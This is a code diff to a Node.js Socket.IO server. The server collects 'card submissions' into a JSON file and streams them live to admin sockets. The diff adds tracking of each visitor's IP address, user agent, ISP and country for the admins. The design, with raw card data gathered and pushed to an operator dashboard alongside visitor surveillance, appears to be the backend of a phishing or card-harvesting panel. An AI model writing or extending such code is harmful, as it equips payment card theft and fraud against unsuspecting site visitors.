@@ -1,4 +1,3 @@
-
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -25,7 +24,7 @@ const io = new Server(server, {
     credentials: true
   },
   upgradeTimeout: 30000,
-  transports: ['websocket', 'polling']
+  transports: ['polling', 'websocket']
 });
 
 // Middleware for parsing JSON
@@ -34,6 +33,9 @@ app.use(express.json());
 // In-memory storage for card submissions
 const submissionsFilePath = path.join(__dirname, 'submissions.json');
 let cardSubmissionsQueue = [];
+
+// In-memory storage for active visitors
+let activeVisitors = new Map();
 
 // Function to load submissions from file
 const loadSubmissions = () => {
@@ -58,24 +60,98 @@ const saveSubmissions = () => {
   }
 };
 
+// Function to get client IP address
+const getClientIP = (socket) => {
+  return socket.handshake.headers['x-forwarded-for'] || 
+         socket.handshake.headers['x-real-ip'] || 
+         socket.conn.remoteAddress || 
+         socket.handshake.address || 
+         'Unknown';
+};
+
+// Function to simulate ISP and location data (in production, use a real API)
+const getLocationData = (ip) => {
+  const mockData = {
+    'Unknown': { isp: 'Unknown ISP', country: 'Unknown', country_flag: '🌍' },
+    '127.0.0.1': { isp: 'Local Development', country: 'Localhost', country_flag: '💻' },
+    'localhost': { isp: 'Local Development', country: 'Localhost', country_flag: '💻' }
+  };
+  
+  return mockData[ip] || {
+    isp: 'Unknown ISP',
+    country: 'Unknown Location',
+    country_flag: '🌍'
+  };
+};
+
 // Load submissions when the server starts
 loadSubmissions();
+
+// Clean up inactive visitors every 2 minutes
+setInterval(() => {
+  const now = Date.now();
+  const inactiveThreshold = 2 * 60 * 1000; // 2 minutes
+  
+  for (const [socketId, visitor] of activeVisitors.entries()) {
+    if (now - visitor.lastSeen > inactiveThreshold) {
+      console.log(`[Server] Removing inactive visitor: ${socketId}`);
+      activeVisitors.delete(socketId);
+      io.emit('visitor_left', { id: socketId });
+    }
+  }
+}, 30000); // Check every 30 seconds
 
 // Socket.IO connection handling
 io.on('connection', (socket) => {
   console.log(`[Server] Socket.IO connection established: ${socket.id}`);
   
-  socket.on('disconnect', (reason) => {
-    console.log(`[Server] Socket.IO disconnected: ${socket.id}, reason: ${reason}`);
-  });
-
-  // Global broadcast for any new connection
-  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
-  console.log(`[Server] Client connected: ${socket.id} from ${clientIp}`);
-  io.emit('visitor_update', {
+  const clientIp = getClientIP(socket);
+  const locationData = getLocationData(clientIp);
+  
+  // Create visitor object
+  const visitor = {
     id: socket.id,
     ip: clientIp,
-    created_at: new Date().toISOString()
+    user_agent: socket.handshake.headers['user-agent'] || 'Unknown',
+    device_time: new Date().toLocaleString(),
+    created_at: new Date().toISOString(),
+    lastSeen: Date.now(),
+    ...locationData
+  };
+  
+  // Store visitor
+  activeVisitors.set(socket.id, visitor);
+  
+  console.log(`[Server] New visitor: ${socket.id} from ${clientIp}`);
+  
+  // Broadcast visitor update to admins
+  io.to('admins').emit('visitor_update', visitor);
+  io.to('admins').emit('enhanced_visitor', visitor);
+  
+  socket.on('disconnect', (reason) => {
+    console.log(`[Server] Socket.IO disconnected: ${socket.id}, reason: ${reason}`);
+    activeVisitors.delete(socket.id);
+    io.emit('visitor_left', { id: socket.id });
+  });
+
+  // Handler for visitor connected event
+  socket.on('visitor_connected', (payload) => {
+    console.log(`[Server] Visitor connected event from ${socket.id}:`, payload);
+    
+    // Update visitor info
+    if (activeVisitors.has(socket.id)) {
+      const existingVisitor = activeVisitors.get(socket.id);
+      const updatedVisitor = {
+        ...existingVisitor,
+        ...payload,
+        lastSeen: Date.now()
+      };
+      activeVisitors.set(socket.id, updatedVisitor);
+      
+      // Broadcast updated visitor info to admins
+      io.to('admins').emit('visitor_update', updatedVisitor);
+      io.to('admins').emit('enhanced_visitor', updatedVisitor);
+    }
   });
 
   // Handler for an admin identifying themselves
@@ -87,6 +163,14 @@ io.on('connection', (socket) => {
     cardSubmissionsQueue.forEach(submission => {
       socket.emit('card_submission', submission);
     });
+    
+    // Send all current visitors to the admin
+    activeVisitors.forEach(visitor => {
+      socket.emit('visitor_update', visitor);
+      socket.emit('enhanced_visitor', visitor);
+    });
+    
+    console.log(`[Server] Sent ${activeVisitors.size} current visitors to admin`);
   });
 
   // Handler for card data from a user
@@ -165,9 +249,13 @@ io.on('connection', (socket) => {
     io.emit('start_chat', payload);
   });
 
-  // Global broadcast for a client disconnecting
-  socket.on('disconnect', () => {
-    io.emit('visitor_left', { id: socket.id });
+  // Update last seen time on any activity
+  socket.onAny(() => {
+    if (activeVisitors.has(socket.id)) {
+      const visitor = activeVisitors.get(socket.id);
+      visitor.lastSeen = Date.now();
+      activeVisitors.set(socket.id, visitor);
+    }
   });
 });
 
